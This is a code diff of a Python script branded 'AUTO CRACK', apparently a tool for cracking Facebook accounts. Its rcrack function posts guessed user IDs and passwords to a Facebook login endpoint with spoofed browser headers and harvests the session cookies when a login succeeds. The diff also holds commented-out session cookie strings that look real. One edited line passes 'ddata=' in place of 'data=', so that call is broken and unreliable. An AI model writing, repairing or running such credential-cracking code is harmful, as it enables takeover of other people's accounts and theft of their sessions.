@@ -90,20 +90,20 @@ ha = current.day
 today = date.today()
 os.system('xdg-open https://facebook.com/groups/3206414299669908/')
 logo =("""\x1b[1;97m
-d8888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db 
+88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
 88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
-88oobY' 88ooo88 88ooo   `8bo.   88ooo88 88V8o 88 
-88`8b   88~~~88 88~~~     `Y8b. 88~~~88 88 V8o88 
+88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
+88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
 88 `88. 88   88 88      db   8D 88   88 88  V888 
 88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
-===================================================
-[√] AUTHOR  : RAFSAN AHAMMED RAFI
-[√] FACEBOOK: MD. ARIF MIA
-[√] GITHUB  : R4FSAN-143
-[√] WATHAPP : 0130xxxxx54
-[√] TOOLS   : AUTO CRACK
-[√] Stetus  : FREE
-[★] VIRSION : 0.1.9
+\x1b[1;97m===================================================
+\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
+\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
+\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
+\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m WATHAPP : 0130xxxxx54
+\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : AUTO CRACK
+\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : FREE
+\033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 2.0
 ====================================================""") 
 loop = 0
 oks = []
@@ -232,7 +232,8 @@ def rcrack(uid,pwx,tl):
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
-            # 'cookie': 'datr=wZ_pY9aMkf8AFEgFXkpkr-oo; sb=wZ_pY2-V7WuYpyeZg3yMObfx; locale=en_US; m_pixel_ratio=1.75; zsh=ASTH7pQYoHT08yS4lY8uEkh9c7JewfkA7_rFjFnPhRFIG77Mg7D4BYeEVQIy-FcQU2Fh0pNy3C9pH992nL925PUYoQ-JLYMwanULGMbLooYC29cIu7R4bpgfiKxsZrd-FsH9MesXKVfHpyZQvKHdoprzOg40JOSrs5kEemmKlUT_HGuStIe2Gcxg4-dmD98RpD7xdE3OWlWGCCYRDeqBVG1Xe1caMBTuwRylrheB1s1tFc5VnvyI2S_a5IGP4zP7RB0HA82hWnBIgse6mVzBRtUGJspsFZdGgP8Jfly1XThmzo30erITplrxNTCd_mLNUvILpgDUq5Ie3nes6yJ4UKA; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZaRGxQaVRJQ19fTHhWSXNMLTY0cjFpN3p2V3dSX2JLM1VlQWJPbjZvRmdwZUZuREp4cURmbVNfRWZuMUJzRlN5ayIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZlpEbFBpVElDX19MeFZJc0wtNjRyMWk3enZXd1JfYkszVWVBYk9uNm9GZ3BlRm5ESnhxRGZtU19FZm4xQnNGU3lrIiwicyI6Im0ifQ%3D%3D; wd=412x828; fr=0Io6O5s8KoLgbsXZd.AWVWCswn_OAYO30YzTlbPci90x4.Bj9FoG.jZ.AAA.0.0.Bj-JWe.AWWACzCqSfI',
+            # 'cookie': 'datr=wZ_pY9aMkf8AFEgFXkpkr-oo; sb=wZ_pY2-V7WuYpyeZg3yMObfx; locale=en_US; zsh=ASQZMRDclSEIR48qwhhwUQNHKnUDTKJhcWDVYloL1-mT5RVP7crDDMtsd1a2aUU3mSp9IFdryhwlwc9Ug0YTfy-1_ox79u8H4kQ_8-ppI2w5qqEz1mjoRrHhmZmqCZhlL4ZVWHNTyNCBOqLJlVEnl33K_PYHjNtzpG4jKGi5o0d8z0KygIYTXKphUgMSKuME-DOd0VE4xIkhtbGe0shqEIfnsaVA22fJKFlgABpkhVU2fAikSMhwRAqhNq3ekn2WXygL1fkURwX57EIeF-bBkS1ctgZS5lKaz8g4vMzYb-pi8R8LsiSLIOLvI16J-kVQZJP7dcY5kQGOXRaJW8L5xSI; m_pixel_ratio=1.75; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZiMnMxTnhVdV91WkVfUmlmYjE1SFhVRl95clNpUW5ISG5nekhsOEdjZDJxSE9IRXhuTUdkRFdsc2NEZGFwM1g2RSIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZmIyczFOeFV1X3VaRV9SaWZiMTVIWFVGX3lyU2lRbkhIbmd6SGw4R2NkMnFIT0hFeG5NR2REV2xzY0RkYXAzWDZFIiwicyI6Im1vYmlsZSJ9; wd=412x772; fr=0Io6O5s8KoLgbsXZd.AWXEheXKoKz1xa7kKeRNZbNcg-E.Bj9FoG.jZ.AAA.0.0.Bj_WpS.AWVQDaMcWZg',
+            'referer': 'https://mbasic.facebook.com/login/?li=X2r9Y3JggxzXh8T85_4uW87S&e=1348131&shbl=1&ref=dbl&refsrc=deprecated&_rdr',
             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -241,8 +242,8 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',}
+            lo = session.post('https://mbasic.facebook.com/login/?li=X2r9Y3JggxzXh8T85_4uW87S&e=1348131&shbl=1&ref=dbl&refsrc=deprecated&_rdr',ddata=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
